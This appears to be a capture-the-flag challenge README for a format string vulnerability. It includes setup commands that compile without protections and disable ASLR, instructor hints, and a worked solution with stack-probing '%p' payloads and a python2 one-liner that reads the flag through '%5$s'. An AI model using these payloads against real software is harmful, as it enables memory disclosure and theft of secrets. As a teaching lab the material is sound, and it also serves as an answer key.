# Setup
Tested on Ubuntu 18.04.

There are two versions of the binaries and source code--one each with the flag redacted and one
with the actual flag that will be used to run the actual service.

Compile binary without stack protection (not necessary if using the binary already in this folder)
`gcc format.c -o format -fno-stack-protector -z execstack -no-pie -fno-pie`

Disable ASLR on server:
```
# disable in current session
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# make change permanent (across reboots)
echo "kernel.randomize_va_space = 0" > /etc/sysctl.d/01-disable-aslr.conf
```

# Description
We found a service at `<ip>:<port>` containing a flag in a global variable, but unfortunately the 
access code authentication seems to be broken. Can you print out the flag stored in the global variable?
We found this [binary]() and this copy of the [source code]() with the flag redacted.

# Hints

##Name of Vuln
Format string attack

## Where
The vulnerability is located at lines 6-8 of the program.

## Vague solution strategy
This program takes an input from stdin and prints it out using `printf`. See if you can force `printf` to 
print the string stored in the `flag` variable by passing in a format string carefully crafted to print the `flag` variable.

## First steps to the solution
The program already helps us out by printing out the address of the flag variable, which is `0x56557008`. Try passing in the following string as input to view the stack and see where your input from stdin is being stored: `AAAA %p %p %p %p %p %p %p %p %p %p`.
-Follow up if they do not recognize X41 as A. Make sure they can find their input on the 4th spot.

# Solution
The program already helps us out by printing out the address of the flag variable, which is `0x56557008`.

We can then pass the following as input to view the stack and see at what offset our input is being stored:
```
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
```

We can see that `AAAA` is being stored as 0x41414141 at offset 4. We can view that portion of the stack 
directly using `%4$p` as input:
```
AAAA %4$p %p %p %p 
```

Now let's pass the address of the flag as the second input so it gets stored in the stack next to
the first input, and we will pass a `%s` to print it out as a string.
```
python2 -c 'print "AAAA" + "\x08\x70\x55\x56" + "%5$s" | ./format

Let them try it on the NC instance and see if they notice that the flag address is slightly different now that the variable is not "redacted"
```
